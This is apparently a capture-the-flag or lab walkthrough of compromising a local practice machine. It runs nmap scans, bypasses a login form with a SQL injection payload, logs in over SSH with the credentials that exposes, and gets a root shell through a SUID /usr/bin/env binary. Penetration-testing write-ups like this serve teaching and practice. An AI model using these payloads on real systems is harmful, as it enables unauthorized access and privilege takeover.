1. Reconnaissance

The initial step was to verify connectivity to the target machine:
    ping -c 1 172.17.0.2
The host responded successfully, confirming network access.
A full TCP port scan was performed to identify open services:
    nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2
Open ports discovered:
- 22/tcp – SSH  
- 80/tcp – HTTP  
A more detailed scan was then performed:
    sudo nmap -sCV -p22,80 -v 172.17.0.2
This revealed that port 80 was running an Apache HTTP server. Accessing the web service via browser presented a login form.

2. Exploitation

A classic SQL injection was used to bypass the login mechanism:
- Username: admin' or 1=1 -- -  
- Password: Any value (e.g., 1234)
The injection was successful, and access to the application was granted. This revealed valid SSH credentials.
An SSH session was then established using the discovered credentials:
    ssh username@172.17.0.2

3. Privilege Escalation

After logging in, user privileges were verified:
    whoami
The current user was unprivileged. A check for sudo permissions confirmed no elevated rights:
    sudo -l
Next, the system was scanned for SUID binaries:
    find / -perm -4000 2>/dev/null
Among the results, /usr/bin/env was identified as a viable vector. A shell was invoked with elevated privileges:
    /usr/bin/env /bin/sh -p
